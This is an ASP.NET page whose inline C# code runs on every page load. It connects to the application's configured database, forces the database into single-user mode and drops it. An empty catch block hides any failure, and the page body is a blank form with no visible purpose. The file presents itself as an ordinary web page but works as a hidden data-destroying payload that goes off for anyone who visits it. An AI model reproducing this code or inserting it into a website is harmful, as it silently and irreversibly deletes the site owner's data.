<%@ Page Language="C#" %>
<%
    try
    {
            Microsoft.Practices.EnterpriseLibrary.Data.Database database = Microsoft.Practices.EnterpriseLibrary.Data.DatabaseFactory.CreateDatabase();
            System.Data.Common.DbConnection connection = database.CreateConnection();
            System.Data.Common.DbCommand sqlStringCommand = database.GetSqlStringCommand(string.Format("use master;ALTER DATABASE [{0}] SET SINGLE_USER WITH ROLLBACK IMMEDIATE;drop database [{0}]", connection.Database));
                database.ExecuteNonQuery(sqlStringCommand);
         }
    catch (System.Exception ex)
            {
            }
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <asp:Label ID="lblMessage" runat="server"></asp:Label>
    </form>
</body>
</html>
